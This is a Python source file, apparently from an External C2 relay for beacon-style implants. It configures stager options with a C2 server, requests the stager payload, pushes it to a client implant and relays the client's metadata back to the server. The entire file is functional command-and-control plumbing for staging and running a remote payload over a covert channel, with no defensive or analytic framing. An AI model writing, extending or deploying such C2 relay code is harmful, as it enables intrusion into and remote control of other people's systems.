import config
from utils import commonUtils


def configureOptions(sock, arch, pipename, block):
    # This whole function should eventually be refactored into an elaborate forloop so that we can
    #   support additional beacon options down the road
    # send the options
    if config.verbose:
        print commonUtils.color("Configuring stager options")

    beacon_arch = "arch=" + str(arch)
    if config.debug:
        print commonUtils.color(beacon_arch, status=False, yellow=True)
    commonUtils.sendFrameToC2(sock, beacon_arch)

    beacon_pipename = "pipename=" + str(pipename)
    if config.debug:
        print commonUtils.color(beacon_pipename, status=False, yellow=True)
    commonUtils.sendFrameToC2(sock, beacon_pipename)

    beacon_block = "block=" + str(block)
    if config.debug:
        print commonUtils.color(beacon_block, status=False, yellow=True)
    commonUtils.sendFrameToC2(sock, beacon_block)


def requestStager(sock):
    commonUtils.sendFrameToC2(sock, "go")

    stager_payload = commonUtils.recvFrameFromC2(sock)

    return stager_payload


def loadStager(beacon_obj):
    # Send options to the external_c2 server
    configureOptions(beacon_obj.sock, beacon_obj.beacon_arch, beacon_obj.pipe_name, beacon_obj.block_time)

    if config.debug:
        print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)

    # Request stager
    stager_payload = requestStager(beacon_obj.sock)

    if config.debug:
        print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)

    # Prep stager payload
    if config.verbose:
        print commonUtils.color("Encoding stager payload")
    # Trick, this is actually done during sendData()

    # Send stager to the client
    if config.verbose:
        print commonUtils.color("Sending stager to client")
    # Need to make a data frame here
    raw_stager_frame = [beacon_obj.beacon_id, stager_payload]
    commonUtils.sendData(raw_stager_frame)

    # Retrieve the metadata we need to relay back to the server
    if config.verbose:
        print commonUtils.color("Awaiting metadata response from client")
    metadata = commonUtils.retrieveData(beacon_obj.beacon_id)

    # Send the metadata frame to the external_c2 server
    if config.verbose:
        print commonUtils.color("Sending metadata to c2 server")
    if config.debug:
        print (commonUtils.color("METADATA: ", status=False, yellow=True) + "%s") % (metadata)
    commonUtils.sendFrameToC2(beacon_obj.sock, metadata[1])

    # Pretend we have error handling, return 0 if everything is Gucci

    return 0
